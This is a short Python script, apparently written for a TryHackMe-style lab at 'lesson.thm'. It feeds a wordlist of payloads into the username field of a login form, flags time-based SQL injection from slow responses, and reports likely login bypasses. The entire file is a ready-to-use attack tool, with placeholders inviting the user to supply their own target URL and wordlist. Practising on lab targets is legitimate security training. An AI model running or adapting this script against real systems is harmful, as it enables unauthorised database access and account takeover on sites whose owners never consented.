import requests
import time

url = "http://lesson.thm/"     "===> Enter your url"
wordlist = "time_payload.txt"  "===> Enter your wordlist here"
test_password = "test"         "===> Dummy password"

with open(wordlist, "r") as file:
    for payload in file:
        payload = payload.strip()
        data = {"username": payload, "password": test_password}

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
        }

        try:
            start_time = time.time()
            response = requests.post(url, data=data, headers=headers, timeout=10)
            end_time = time.time()

            response_time = end_time - start_time
            response_size = len(response.text)

            print(f"Testing: {payload} | Response Time: {response_time:.2f} sec | Response Size: {response_size}")

            if response_time > 5:  # Time-based SQLi
                print(f"🚀 Possible SQLi (Time-Based) Found! Payload: {payload}")

            if "Welcome" in response.text or "Dashboard" in response.text or response.status_code == 302:  
                print(f"✅ Possible Successful Login! Payload: {payload} | Response Size: {response_size}")

        except requests.exceptions.RequestException as e:
            print(f"❌ Request failed: {e}")
